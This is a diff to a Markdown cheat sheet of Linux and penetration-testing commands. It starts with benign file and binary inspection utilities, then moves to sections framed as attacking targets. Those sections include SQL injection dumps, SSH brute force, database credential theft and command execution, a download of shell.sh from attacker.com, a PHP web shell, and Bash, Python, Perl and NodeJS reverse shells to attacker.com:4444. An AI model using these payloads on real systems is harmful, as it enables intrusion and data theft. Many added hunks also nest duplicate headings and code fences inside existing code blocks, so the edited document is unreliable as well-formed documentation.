@@ -40,135 +40,200 @@ Essential utilities for system inspection, file analysis, and security testing.
 ### File & System Testing
 
 **Test file conditions**
+
+Quick checks for file and directory existence, permissions, and executability.
 ```bash
-test -f /path/to/file     # File exists
-test -d /path/to/dir      # Directory exists
-test -r /path/to/file     # File readable
-test -w /path/to/file     # File writable
-test -x /path/to/binary   # File executable
-test -s /path/to/file     # File exists and has size > 0
+test -f /path/to/file     # check whether a file exists
+test -d /path/to/dir      # check whether a directory exists
+test -r /path/to/file     # check whether a file is readable
+test -w /path/to/file     # check whether a file is writable
+test -x /path/to/binary   # check whether a file is executable
+test -s /path/to/file     # check whether a file exists and is not empty
 ```
 Conditional testing for scripts and security checks.
 
 **View manual pages**
+
+Open and search system manual pages to learn command usage and options.
 ```bash
-man ls                     # View command documentation
-man -k keyword             # Search manual pages
-man 2 open                 # View system call docs
-man 3 printf               # View library function docs
+man ls                     # open the manual page for ls
+man -k keyword             # search manual pages by keyword
+man 2 open                 # open the section 2 manual for the open system call
+man 3 printf               # open the section 3 manual for printf
 ```
 Access documentation for all commands.
 
 **Determine file type**
+
+Identify a file's format and MIME type before analysis.
 ```bash
-file /path/to/file
-file -i /path/to/file     # Show MIME type
+file /path/to/file        # identify a file's type
+file -i /path/to/file     # show the file's MIME type
 ```
 Identify file format and encoding.
 
 **View file statistics**
+
+Show filesystem metadata (size, permissions, timestamps) for a file.
 ```bash
-stat /path/to/file
+stat /path/to/file        # show file metadata such as size, mode, and timestamps
 ```
 Get detailed info: size, permissions, timestamps, inode.
+
+**Compare files**
+
+Show differences between files or folders to spot changes or tampering.
+```bash
+diff file1.txt file2.txt         # show line-by-line differences between two files
+diff -u file1.txt file2.txt      # unified diff format suitable for patches
+diff -r dir1/ dir2/              # recursively compare all files in directories
+diff -q file1.txt file2.txt      # only show whether files differ without details
+```
+Identify changes between files or directories.
 
 ### System information: uname & hostname
 Quick commands to learn system/kernel and host identity.
 
 **Kernel / system info (`uname`)**
 ```bash
-uname                # kernel name
-uname -a             # all info: kernel, hostname, release, version, machine, OS
-uname -r             # kernel release
-uname -m             # machine hardware name (architecture)
-uname -n             # node/host name (same as hostname)
+uname                # print the kernel name
+uname -a             # print full system information
+uname -r             # print the kernel release
+uname -m             # print the machine architecture
+uname -n             # print the host name
 ```
 
 **Hostname / node name (`hostname`)**
 > When someone try to retrieve my information so my hostname is visible to attacker.
 
 ```bash
-hostname             # show current hostname
-hostname -f          # show FQDN (fully qualified domain name)
-hostnamectl status   # systemd: show/manage hostname and related info
-cat /etc/hostname    # static hostname file
+hostname             # show the current hostname
+hostname -f          # show the fully qualified domain name
+hostnamectl status   # show or manage hostname details with systemd
+cat /etc/hostname    # display the static hostname file
 ```
 
 Tip: For distro details, check `cat /etc/os-release`.
 
 **Extract strings from binaries**
 ```bash
-strings /usr/bin/binary
-strings -n 10 /usr/bin/binary    # Minimum 10 characters
+strings /usr/bin/binary        # extract printable strings from a binary
+strings -n 10 /usr/bin/binary   # extract strings with at least 10 characters
 ```
 Find readable text in executables (useful for malware analysis).
 
 ### Binary & Library Analysis
 
 **List dynamic libraries**
+
+Show which shared libraries an executable requires at runtime.
 ```bash
-ldd /usr/bin/binary
-ldd /path/to/executable   # Show required shared libraries
+ldd /usr/bin/binary              # list shared libraries used by a binary
+ldd /path/to/executable          # show required shared libraries
 ```
 Find dependencies for vulnerability research.
 
 **Trace system calls**
+
+Record system calls and signals made by a process for runtime analysis.
 ```bash
-strace /usr/bin/binary
-strace -e trace=open,read,write /bin/ls    # Trace specific calls
-strace -p <PID>            # Trace running process
+strace /usr/bin/binary                 # trace system calls made by a program
+strace -e trace=open,read,write /bin/ls # trace only open, read, and write calls
+strace -p <PID>                        # attach to a running process and trace it
 ```
 Monitor what a program does on the system.
 
 **Trace library calls**
+
+Trace calls to shared libraries (glibc, etc.) made by a program.
 ```bash
-ltrace /usr/bin/binary
-ltrace -e malloc /usr/bin/binary    # Trace specific functions
+ltrace /usr/bin/binary              # trace library calls made by a program
+ltrace -e malloc /usr/bin/binary    # trace only malloc-related calls
 ```
 Track library function usage for debugging.
 
 **View symbol table**
+
+List exported symbols and function names inside binaries or libraries.
 ```bash
-nm /usr/bin/binary
-nm -D /usr/lib/libc.so.6   # Dynamic symbols
+nm /usr/bin/binary             # list symbols from a binary
+nm -D /usr/lib/libc.so.6       # list dynamic symbols from a shared library
 ```
 See exported functions and symbols.
 
 **Read ELF headers**
+
+Inspect ELF headers and sections to understand binary structure.
 ```bash
-readelf -h /usr/bin/binary          # File header
-readelf -S /usr/bin/binary          # Section headers
-readelf -l /usr/bin/binary          # Program headers
-hexdump -C /usr/bin/binary | head   # Hex dump first lines
+readelf -h /usr/bin/binary          # show the ELF file header
+readelf -S /usr/bin/binary          # show ELF section headers
+readelf -l /usr/bin/binary          # show ELF program headers
+hexdump -C /usr/bin/binary | head   # show the first lines of a hex dump
 ```
 Analyze executable structure and content.
 
 ### File Content Analysis
 ### Viewing & filtering file contents
+
+Quick file viewing commands to print, page, or follow file contents.
 ```bash
-cat file.txt                    # print whole file
-cat -n file.txt                 # show line numbers
-head -n 20 file.txt             # first 20 lines
-tail -n 50 file.txt             # last 50 lines
-tail -f /var/log/syslog         # follow appended output
+cat file.txt                    # print the full file contents
+cat -n file.txt                 # print the file with line numbers
+head -n 20 file.txt             # print the first 20 lines
+tail -n 50 file.txt             # print the last 50 lines
+tail -f /var/log/syslog         # follow new log output live
 ```
 
 **Filter with grep**
+
+Search files or streams for text patterns with flexible options.
 ```bash
-grep 'pattern' file.txt                 # search for pattern (case-sensitive)
-grep -i 'pattern' file.txt              # case-insensitive
-grep -n 'pattern' file.txt              # show line numbers
-grep --color=auto 'pattern' file.txt    # highlight matches
-grep -R --exclude-dir=.git 'pattern' /path  # recursive search
-cat file.txt | grep 'pattern'           # pipe cat output to grep (equivalent to grep 'pattern' file.txt)
+grep 'pattern' file.txt                 # search for a text pattern
+grep -i 'pattern' file.txt              # search without case sensitivity
+grep -n 'pattern' file.txt              # show matching line numbers
+grep --color=auto 'pattern' file.txt    # highlight the matched text
+grep -R --exclude-dir=.git 'pattern' /path  # search recursively through directories
+cat file.txt | grep 'pattern'           # filter cat output through grep
+```
+
+**Text processing with awk**
+
+Extract and transform fields from text streams and files using pattern/action rules.
+```bash
+awk '{print $1}' file.txt                # print the first field from each line
+awk -F: '{print $1, $3}' /etc/passwd     # split fields on colon and print selected columns
+awk 'NR==1 {print}' file.txt             # print only the first line
+awk '/error/ {print NR, $0}' file.txt    # print matching lines with line numbers
+```
+
+**Stream editing with sed**
+
+Perform scripted, line-oriented edits and substitutions on streams or files.
+```bash
+sed 's/old/new/' file.txt                # replace the first match on each line
+sed 's/old/new/g' file.txt               # replace every match on each line
+sed -n '1,10p' file.txt                  # print only lines 1 through 10
+sed -i 's/old/new/g' file.txt            # edit the file in place
+```
+
+**Translate or delete characters with tr**
+
+Map, delete, or squeeze characters from input streams for simple transformations.
+```bash
+tr 'a-z' 'A-Z' file.txt                  # convert lowercase to uppercase
+tr -d ' ' file.txt                       # delete all whitespace characters
+tr -s ' ' file.txt                       # squeeze multiple spaces into one
+echo "hello" | tr 'a' 'b'                # replace specific characters
 ```
 
 ### Pager: less
 Essential pager for viewing long files and piped output without loading the whole file.
 
 **Basic usage**
+
+Open long output in an interactive pager for navigation and search.
 ```bash
-less file
+less file                               # open a file in the pager
 ```
 
 **Navigation**
@@ -186,71 +251,81 @@ q           # quit
 
 **Useful options**
 ```bash
-less -N file      # show line numbers
-less -S file      # chop long lines (no wrap)
-less -R file      # preserve ANSI color (show colors)
-less +F file      # follow output (like tail -f); Ctrl-C to stop
-zless file.gz     # view compressed files
+less -N file      # show line numbers in the pager
+less -S file      # chop long lines instead of wrapping them
+less -R file      # preserve ANSI color output
+less +F file      # follow appended output like tail -f
+zless file.gz     # view a compressed file in less
 ```
 
 **Examples**
 ```bash
-less /var/log/syslog
-tail -n 200 /var/log/syslog | less -S
-ls --color=always | less -R
-less -N bigfile.txt
+less /var/log/syslog                 # open syslog in the pager
+tail -n 200 /var/log/syslog | less -S  # page through the last 200 log lines
+ls --color=always | less -R         # preserve color when paging command output
+less -N bigfile.txt                 # open a file with line numbers shown
 ```
 
 ### Word count: wc
 Count lines, words, and bytes in files or streams.
 
-**Basic usage**
+Quickly count lines, words, characters, or longest line length in input.
 ```bash
-wc file.txt           # shows lines, words, bytes, filename
-wc -l file.txt        # number of lines
-wc -w file.txt        # number of words
-wc -c file.txt        # number of bytes
-wc -m file.txt        # number of characters
-wc -L file.txt        # length of longest line
+wc file.txt           # count lines, words, and bytes in a file
+wc -l file.txt        # count the number of lines
+wc -w file.txt        # count the number of words
+wc -c file.txt        # count the number of bytes
+wc -m file.txt        # count the number of characters
+wc -L file.txt        # show the length of the longest line
 ```
 
 **With pipes / examples**
 ```bash
-echo "one two three" | wc -w        # prints 3
-grep -oE "\w+" file.txt | wc -l    # count words (approx)
-awk '{sum+=NF} END{print sum}' file.txt  # accurate word count using awk
+echo "one two three" | wc -w        # count words from standard input
+grep -oE "\w+" file.txt | wc -l    # count words by extracting each match first
+awk '{sum+=NF} END{print sum}' file.txt  # count words accurately with awk
 ```
 
 ## Core Commands Summary
 **Hex dump files**
+
+Display binary data in hexadecimal and ASCII for inspection.
 ```bash
-hexdump -C /tmp/myfile
-hexdump -C /tmp/myfile | head -20
+hexdump -C /tmp/myfile             # show a canonical hex dump
+hexdump -C /tmp/myfile | head -20  # show only the first 20 lines of the dump
 ```
 View binary/text content in hexadecimal format.
 
 **Octal dump**
+
+Alternative binary viewers showing character, hex, or octal representations.
 ```bash
-od -c /tmp/myfile          # Character dump
-od -x /tmp/myfile          # Hex dump
-od -b /tmp/myfile          # Byte dump
+od -c /tmp/myfile          # show the file as characters
+od -x /tmp/myfile          # show the file as hexadecimal values
+od -b /tmp/myfile          # show the file as octal bytes
 ```
 Alternative binary content viewer.
 
 ### Directory & Permission Analysis
 
 **Find file locations**
+
+Quickly locate binaries, manuals, and files on the system.
 ```bash
-which bash                 # Find command in PATH
-whereis ls                 # Find command, source, man page
+which bash                 # show the path of a command in PATH
+whereis ls                 # show the binary, source, and man page locations
+locate passwd              # find all files named passwd or similar
+locate filename            # search the file database by name
 ```
 Locate executables and resources.
 
 **Check file attributes**
+
+View and modify extended filesystem attributes such as immutable flags.
 ```bash
-lsattr /path/to/file       # List extended attributes
-chattr +i /path/to/file    # Make immutable (requires root)
-chattr -i /path/to/file    # Remove immutable flag
+lsattr /path/to/file       # show extended file attributes
+chattr +i /path/to/file    # make a file immutable
+chattr -i /path/to/file    # remove the immutable flag
 ```
 View and modify immutable/append-only flags.
 
@@ -258,28 +333,28 @@ View and modify immutable/append-only flags.
 
 **Check if port is listening (alternative to netstat)**
 ```bash
-test -S /var/run/docker.sock && echo "Docker socket exists"
+test -S /var/run/docker.sock && echo "Docker socket exists"  # check whether the Docker socket exists
 ```
 
 **Verify binary hasn't been modified**
 ```bash
-sha256sum /usr/bin/binary > checksum.txt
+sha256sum /usr/bin/binary > checksum.txt   # save the binary's SHA-256 checksum
 # Later: verify with
-sha256sum -c checksum.txt
+sha256sum -c checksum.txt                  # verify the saved checksum file
 ```
 
 **Find recently modified files**
 ```bash
-find /home -type f -mtime -7   # Modified in last 7 days
+find /home -type f -mtime -7   # find files modified within the last 7 days
 ```
 
 **Analyze suspicious executable**
 ```bash
-file suspected_binary
-strings suspected_binary | grep -i "shell|http|cmd"
-ldd suspected_binary
-readelf -S suspected_binary
-strace suspected_binary 2>&1 | head -50
+file suspected_binary                          # identify the file type
+strings suspected_binary | grep -i "shell|http|cmd"  # search strings for suspicious terms
+ldd suspected_binary                           # list shared library dependencies
+readelf -S suspected_binary                    # show ELF sections
+strace suspected_binary 2>&1 | head -50        # capture the first 50 traced system calls
 ```
 
 ---
@@ -292,26 +367,34 @@ Gather intel about targets before attacking.
 ### Domain and Host Information
 
 **Find IP of domain**
+
+Resolve a domain to its IP address for targeting.
 ```bash
-nslookup example.com
+nslookup example.com      # resolve a domain name to an IP address
 ```
 DNS lookup to get target IP.
 
 **Detailed DNS records**
+
+Query DNS for all record types and responses.
 ```bash
-dig example.com
+dig example.com           # query DNS records for a domain
 ```
 Shows all DNS data.
 
 **WHOIS domain info**
+
+Retrieve domain registration and ownership metadata.
 ```bash
-whois example.com
+whois example.com         # look up domain registration information
 ```
 Get domain owner, registrar, dates.
 
 **Reverse DNS**
+
+Find the hostname associated with an IP address.
 ```bash
-dig -x 192.168.1.1
+dig -x 192.168.1.1        # perform a reverse DNS lookup on an IP address
 ```
 Find hostname from IP.
 
@@ -319,13 +402,21 @@ Find hostname from IP.
 
 **Ping a network range**
 ```bash
-ping -c 1 192.168.1.1
+**Ping a network range**
+
+Quick liveness test of a host using ICMP.
+```bash
+ping -c 1 192.168.1.1     # send one ping to check whether a host is alive
 ```
 Test if host is alive.
 
 **Ping sweep (find active hosts)**
 ```bash
-for i in {1..254}; do ping -c1 192.168.1.$i & done
+**Ping sweep (find active hosts)**
+
+Probe an entire subnet to discover live hosts.
+```bash
+for i in {1..254}; do ping -c1 192.168.1.$i & done  # ping every host in the subnet
 ```
 Find all active IPs in subnet.
 
@@ -333,13 +424,21 @@ Find all active IPs in subnet.
 
 **Check DNS servers**
 ```bash
-cat /etc/resolv.conf
+**Check DNS servers**
+
+Show system-configured DNS resolvers.
+```bash
+cat /etc/resolv.conf      # show the configured DNS servers
 ```
 See which DNS your target uses.
 
 **Test connectivity**
 ```bash
-mtr google.com
+**Test connectivity**
+
+Run a combined traceroute and ping with live latency stats.
+```bash
+mtr google.com            # trace the route to a host with live latency stats
 ```
 Live trace route to target.
 
@@ -354,13 +453,13 @@ Gather intelligence without touching the target.
 
 **Find emails for domain**
 ```bash
-theHarvester -d example.com -b google
+theHarvester -d example.com -b google  # gather emails and subdomains from Google
 ```
 Harvests emails from Google, Bing, etc.
 
 **Find subdomains**
 ```bash
-theHarvester -d example.com -b all
+theHarvester -d example.com -b all     # run passive subdomain enumeration against many sources
 ```
 Passive subdomain enumeration.
 
@@ -368,19 +467,19 @@ Passive subdomain enumeration.
 
 **Extract metadata from files**
 ```bash
-exiftool document.pdf
+exiftool document.pdf     # extract metadata from a file
 ```
 Get hidden metadata (author, dates, GPS).
 
 **Batch extract from images**
 ```bash
-exiftool *.jpg
+exiftool *.jpg            # extract metadata from all JPEG files in the folder
 ```
 Extract all image metadata.
 
 **Remove metadata**
 ```bash
-exiftool -all= document.pdf
+exiftool -all= document.pdf  # remove metadata from a file
 ```
 Strip sensitive metadata.
 
@@ -388,19 +487,23 @@ Strip sensitive metadata.
 
 **Search Shodan CLI**
 ```bash
-shodan search apache
+**Search Shodan CLI**
+
+Search the internet for exposed services and devices.
+```bash
+shodan search apache      # search Shodan for Apache hosts
 ```
 Find systems running Apache.
 
 **Find webcams**
 ```bash
-shodan search webcam
+shodan search webcam      # search Shodan for exposed webcams
 ```
 Locate exposed cameras.
 
 **Get host info**
 ```bash
-shodan host 1.2.3.4
+shodan host 1.2.3.4       # display Shodan data for an IP address
 ```
 Get details about IP from Shodan.
 
@@ -408,13 +511,21 @@ Get details about IP from Shodan.
 
 **Check IP reputation**
 ```bash
-curl https://api.abuseipdb.com/api/v2/check?ipAddress=1.2.3.4
+**Check IP reputation**
+
+Query external reputation services for IP threat history.
+```bash
+curl https://api.abuseipdb.com/api/v2/check?ipAddress=1.2.3.4  # check IP reputation with AbuseIPDB
 ```
 Check if IP is blacklisted.
 
 **Find DNS history**
 ```bash
-dig +nocmd example.com +noall +answer
+**Find DNS history**
+
+Show only DNS answers to inspect current records quickly.
+```bash
+dig +nocmd example.com +noall +answer  # print only the DNS answer section
 ```
 Check DNS records.
 
@@ -426,61 +537,97 @@ Find open ports and running services.
 
 **Basic port scan**
 ```bash
-nmap example.com
+**Basic port scan**
+
+Default Nmap scan to discover commonly open TCP ports.
+```bash
+nmap example.com          # scan the most common 1000 TCP ports
 ```
 Scan most common 1000 ports.
 
 **Scan specific ports**
 ```bash
-nmap -p 22,80,443,3306 example.com
+**Scan specific ports**
+
+Probe only the listed ports to speed up scans or focus on services.
+```bash
+nmap -p 22,80,443,3306 example.com  # scan only the specified ports
 ```
 Check only these ports (SSH, HTTP, HTTPS, MySQL).
 
 **Scan ALL ports**
 ```bash
-nmap -p- example.com
+**Scan ALL ports**
+
+Comprehensive scan across all TCP ports (time-consuming).
+```bash
+nmap -p- example.com      # scan all 65,535 TCP ports
 ```
 Check all 65,535 ports (slow!).
 
 **Service version detection**
 ```bash
-nmap -sV example.com
+**Service version detection**
+
+Probe open ports to identify service software and versions.
+```bash
+nmap -sV example.com      # detect service versions on open ports
 ```
 Identify what software is running.
 
 **OS detection**
 ```bash
-nmap -O example.com
+**OS detection**
+
+Attempt to fingerprint the remote operating system.
+```bash
+nmap -O example.com       # attempt operating system detection
 ```
 Guess operating system.
 
 **Aggressive scan (VERY LOUD)**
 ```bash
-nmap -A example.com
+**Aggressive scan (VERY LOUD)**
+
+Run a combined set of scans (scripts, version, OS, traceroute).
+```bash
+nmap -A example.com       # run aggressive scan options
 ```
 Service, OS, script scan, traceroute.
 
 **UDP scan**
 ```bash
-nmap -sU example.com
+**UDP scan**
+
+Probe UDP services which are commonly overlooked by basic scans.
+```bash
+nmap -sU example.com      # scan UDP ports
 ```
 Scan UDP ports.
 
 **Scan through firewall**
 ```bash
-nmap -Pn example.com
+**Scan through firewall**
+
+Skip host discovery steps when ICMP is blocked; scan directly.
+```bash
+nmap -Pn example.com      # skip host discovery and scan directly
 ```
 Don't ping first, just scan.
 
 **Stealth scan (slower)**
 ```bash
-nmap -sS example.com
+**Stealth scan (slower)**
+
+Perform a SYN scan that may be less noisy to logging systems.
+```bash
+nmap -sS example.com      # run a SYN scan
 ```
 SYN scan, less likely to be logged.
 
 **Save output**
 ```bash
-nmap -A example.com -oN scan.txt
+nmap -A example.com -oN scan.txt  # save scan output to a normal text file
 ```
 Save results to file.
 
@@ -488,19 +635,31 @@ Save results to file.
 
 **Check SMB shares**
 ```bash
-smbclient -L //192.168.1.1
+**Check SMB shares**
+
+Enumerate available SMB shares and access points on a host.
+```bash
+smbclient -L //192.168.1.1   # list SMB shares on a host
 ```
 List network shares.
 
 **Check HTTP headers**
 ```bash
-curl -I https://example.com
+**Check HTTP headers**
+
+Fetch response headers to inspect server info and security headers.
+```bash
+curl -I https://example.com  # fetch only HTTP response headers
 ```
 Get server info and headers.
 
 **Check HTTP methods**
 ```bash
-curl -X OPTIONS -v https://example.com
+**Check HTTP methods**
+
+Query which HTTP methods the server accepts (e.g., PUT, DELETE).
+```bash
+curl -X OPTIONS -v https://example.com  # ask the server which HTTP methods it allows
 ```
 See what HTTP methods allowed.
 
@@ -515,19 +674,19 @@ Find security weaknesses.
 
 **Check SSL/TLS**
 ```bash
-openssl s_client -connect example.com:443
+openssl s_client -connect example.com:443  # inspect the TLS certificate and handshake
 ```
 Check certificate and SSL version.
 
 **Check HTTP methods**
 ```bash
-nmap --script http-methods example.com
+nmap --script http-methods example.com     # run the Nmap HTTP methods script
 ```
 Find dangerous HTTP methods.
 
 **Subdomain enumeration**
 ```bash
-nmap -sL example.com
+nmap -sL example.com       # perform a list scan without probing hosts
 ```
 Find subdomains.
 
@@ -535,19 +694,19 @@ Find subdomains.
 
 **Check Telnet (insecure)**
 ```bash
-telnet example.com 23
+telnet example.com 23      # open a Telnet connection to a host
 ```
 Test unencrypted access.
 
 **Check FTP**
 ```bash
-ftp example.com
+ftp example.com            # connect to an FTP server
 ```
 Test FTP access (unencrypted).
 
 **Check default credentials**
 ```bash
-nmap -p 3389 --script rdp-enum-encryption 192.168.1.1
+nmap -p 3389 --script rdp-enum-encryption 192.168.1.1  # check RDP encryption settings
 ```
 Find RDP weaknesses.
 
@@ -562,13 +721,21 @@ Automated web application vulnerability testing.
 
 **Basic web scan**
 ```bash
-nikto -h http://example.com
+**Basic web scan**
+
+Run a fast server-level scan for common web misconfigurations and issues.
+```bash
+nikto -h http://example.com  # scan a web server for common vulnerabilities
 ```
 Scan for web vulnerabilities.
 
 **Scan with proxy**
 ```bash
-nikto -h http://example.com -useproxy http://127.0.0.1:8080
+**Scan with proxy**
+
+Route scanner traffic through an intercepting proxy for inspection.
+```bash
+nikto -h http://example.com -useproxy http://127.0.0.1:8080  # route Nikto through a proxy
 ```
 Use Burp Suite proxy.
 
@@ -576,19 +743,27 @@ Use Burp Suite proxy.
 
 **Find SQL injection**
 ```bash
-sqlmap -u "http://example.com/search.php?q=test" --dbs
+**Find SQL injection**
+
+Automate testing for SQL injection and enumerate database contents.
+```bash
+sqlmap -u "http://example.com/search.php?q=test" --dbs  # test for SQL injection and list databases
 ```
 Test for SQLi and enumerate databases.
 
 **Dump database**
 ```bash
-sqlmap -u "http://example.com/search.php?q=test" -D database_name -T users --dump
+**Dump database**
+
+Extract table contents once injection is confirmed.
+```bash
+sqlmap -u "http://example.com/search.php?q=test" -D database_name -T users --dump  # dump a specific table from a database
 ```
 Extract user table.
 
 **Interactive shell**
 ```bash
-sqlmap -u "http://example.com/search.php?q=test" --os-shell
+sqlmap -u "http://example.com/search.php?q=test" --os-shell  # try to obtain an operating-system shell
 ```
 Get OS command execution.
 
@@ -596,13 +771,17 @@ Get OS command execution.
 
 **Start proxy**
 ```bash
-burpsuite &
+**Start proxy**
+
+Launch Burp Suite for HTTP interception, scanning, and analysis.
+```bash
+burpsuite &                # start Burp Suite in the background
 ```
 Launch Burp (set to 127.0.0.1:8080).
 
 **Use proxy with curl**
 ```bash
-curl -x http://127.0.0.1:8080 http://example.com
+curl -x http://127.0.0.1:8080 http://example.com  # send traffic through the local proxy
 ```
 Route traffic through Burp.
 
@@ -610,13 +789,17 @@ Route traffic through Burp.
 
 **Start ZAP**
 ```bash
-zaproxy &
+**Start ZAP**
+
+Start OWASP ZAP for automated and interactive web scanning.
+```bash
+zaproxy &                  # start OWASP ZAP in the background
 ```
 Launch OWASP ZAP.
 
 **Automated scan**
 ```bash
-zap-cli scan -r report.html http://example.com
+zap-cli scan -r report.html http://example.com  # run an automated ZAP scan and save a report
 ```
 Full web app scan with report.
 
@@ -631,31 +814,35 @@ Attack databases directly.
 
 **Connect to MySQL**
 ```bash
-mysql -h 192.168.1.5 -u root -p
+**Connect to MySQL**
+
+Open a MySQL client connection to interact with the database.
+```bash
+mysql -h 192.168.1.5 -u root -p  # connect to a MySQL server and prompt for a password
 ```
 Connect to MySQL server.
 
 **No password needed?**
 ```bash
-mysql -h 192.168.1.5 -u root
+mysql -h 192.168.1.5 -u root    # connect to MySQL without entering a password
 ```
 Sometimes no auth required.
 
 **Enumerate databases**
 ```bash
-mysql -h 192.168.1.5 -u root -p -e "SHOW DATABASES;"
+mysql -h 192.168.1.5 -u root -p -e "SHOW DATABASES;"  # list MySQL databases
 ```
 List all databases.
 
 **Get users and passwords**
 ```bash
-mysql -h 192.168.1.5 -u root -p -e "SELECT user, password FROM mysql.user;"
+mysql -h 192.168.1.5 -u root -p -e "SELECT user, password FROM mysql.user;"  # query MySQL users and password hashes
 ```
 Dump MySQL users.
 
 **Read files**
 ```bash
-mysql -h 192.168.1.5 -u root -p -e "LOAD_FILE('/etc/passwd')"
+mysql -h 192.168.1.5 -u root -p -e "LOAD_FILE('/etc/passwd')"  # attempt to read a local file through MySQL
 ```
 Read files via MySQL.
 
@@ -663,25 +850,29 @@ Read files via MySQL.
 
 **Connect to PostgreSQL**
 ```bash
-psql -h 192.168.1.5 -U postgres
+**Connect to PostgreSQL**
+
+Launch a PostgreSQL client session to query and enumerate data.
+```bash
+psql -h 192.168.1.5 -U postgres  # connect to a PostgreSQL server
 ```
 Connect to PostgreSQL.
 
 **List databases**
 ```bash
-psql -h 192.168.1.5 -U postgres -c "SELECT datname FROM pg_database WHERE datistemplate = false;"
+psql -h 192.168.1.5 -U postgres -c "SELECT datname FROM pg_database WHERE datistemplate = false;"  # list non-template PostgreSQL databases
 ```
 Enumerate databases.
 
 **Get table contents**
 ```bash
-psql -h 192.168.1.5 -U postgres -d database_name -c "SELECT * FROM table_name;"
+psql -h 192.168.1.5 -U postgres -d database_name -c "SELECT * FROM table_name;"  # dump rows from a PostgreSQL table
 ```
 Dump table data.
 
 **Execute commands**
 ```bash
-psql -h 192.168.1.5 -U postgres -c "CREATE FUNCTION exec(text) returns text AS 'select system($1)' language SQL;"
+psql -h 192.168.1.5 -U postgres -c "CREATE FUNCTION exec(text) returns text AS 'select system($1)' language SQL;"  # create a UDF-style function for command execution
 ```
 Code execution via UDF.
 
@@ -689,27 +880,31 @@ Code execution via UDF.
 
 **Connect to MongoDB**
 ```bash
-mongo 192.168.1.5:27017
+**Connect to MongoDB**
+
+Start an interactive MongoDB shell to inspect databases and collections.
+```bash
+mongo 192.168.1.5:27017     # connect to MongoDB on the default port
 ```
 Connect to MongoDB.
 
 **List databases**
 ```bash
-mongo 192.168.1.5:27017/admin --eval "db.adminCommand('listDatabases')"
+mongo 192.168.1.5:27017/admin --eval "db.adminCommand('listDatabases')"  # list all MongoDB databases
 ```
 Show all databases.
 
 **Dump collection**
 ```bash
-mongo 192.168.1.5:27017/database_name --eval "db.collection_name.find().pretty()"
+mongo 192.168.1.5:27017/database_name --eval "db.collection_name.find().pretty()"  # print a MongoDB collection in readable form
 ```
 Export collection data.
 
 **Check authentication**
 ```bash
-mongo 192.168.1.5:27017
-use admin
-db.getUsers()
+mongo 192.168.1.5:27017   # connect to MongoDB
+use admin                 # switch to the admin database
+db.getUsers()             # list users if authentication is enabled
 ```
 See if authentication is enabled.
 
@@ -721,19 +916,23 @@ Common techniques for gaining access.
 
 **Brute force SSH**
 ```bash
-hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://example.com
+**Brute force SSH**
+
+Use a password list to attempt authentication against SSH services.
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://example.com  # brute-force SSH logins
 ```
 Try passwords against SSH.
 
 **HTTP basic auth brute force**
 ```bash
-hydra -l admin -P /usr/share/wordlists/rockyou.txt http-basic://example.com
+hydra -l admin -P /usr/share/wordlists/rockyou.txt http-basic://example.com  # brute-force HTTP basic auth
 ```
 Try passwords on HTTP auth.
 
 **Crack password hashes**
 ```bash
-hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt  # crack NTLM hashes with a wordlist
 ```
 Hash cracking with dictionary.
 
@@ -741,19 +940,23 @@ Hash cracking with dictionary.
 
 **Copy exploitation tool**
 ```bash
-scp exploit.sh user@target:/tmp/
+**Copy exploitation tool**
+
+Send files or tools to a remote host for local execution.
+```bash
+scp exploit.sh user@target:/tmp/  # copy a file to a remote host
 ```
 Transfer script to target.
 
 **Download file from target**
 ```bash
-scp user@target:/etc/passwd ./
+scp user@target:/etc/passwd ./    # copy a file from a remote host to the current directory
 ```
 Get files from target.
 
 **Download with curl**
 ```bash
-curl -O http://attacker.com/shell.sh
+curl -O http://attacker.com/shell.sh  # download a file and keep its original name
 ```
 Download shell.
 
@@ -761,25 +964,41 @@ Download shell.
 
 **Bash reverse shell**
 ```bash
-bash -i >& /dev/tcp/attacker.com/4444 0>&1
+**Bash reverse shell**
+
+Create a simple reverse TCP shell back to an attacker-controlled listener.
+```bash
+bash -i >& /dev/tcp/attacker.com/4444 0>&1  # open a bash reverse shell to the attacker
 ```
 Connect back to attacker.
 
 **Python reverse shell**
 ```bash
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
+**Python reverse shell**
+
+Use Python to spawn a remote interactive shell to an attacker's listener.
+```bash
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'  # open a Python reverse shell
 ```
 Python shell connection.
 
 **Listener for reverse shell**
 ```bash
-nc -lvnp 4444
+**Listener for reverse shell**
+
+Start a netcat listener to receive inbound reverse shells.
+```bash
+nc -lvnp 4444  # listen for an incoming reverse shell on port 4444
 ```
 Listen for incoming connection on port 4444.
 
 ### Web Shells & Payloads
 
 **Simple PHP web shell**
+```php
+**Simple PHP web shell**
+
+A minimal PHP backdoor that executes arbitrary system commands via a query parameter.
 ```php
 <?php system($_GET['cmd']); ?>
 ```
@@ -806,12 +1025,16 @@ For Java servers.
 
 **One-liner NodeJS payload**
 ```bash
-require('child_process').exec('bash -i >& /dev/tcp/attacker.com/4444 0>&1')
+**One-liner NodeJS payload**
+
+Execute a system command from a Node.js context to spawn a reverse shell.
+```bash
+require('child_process').exec('bash -i >& /dev/tcp/attacker.com/4444 0>&1')  # execute a Bash reverse shell from Node.js
 ```
 
 **Perl reverse shell**
 ```perl
-perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
+perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'  # open a Perl reverse shell
 ```
 
 ---
@@ -825,38 +1048,46 @@ Automated exploitation framework.
 
 **Start MSFConsole**
 ```bash
-msfconsole
+**Start MSFConsole**
+
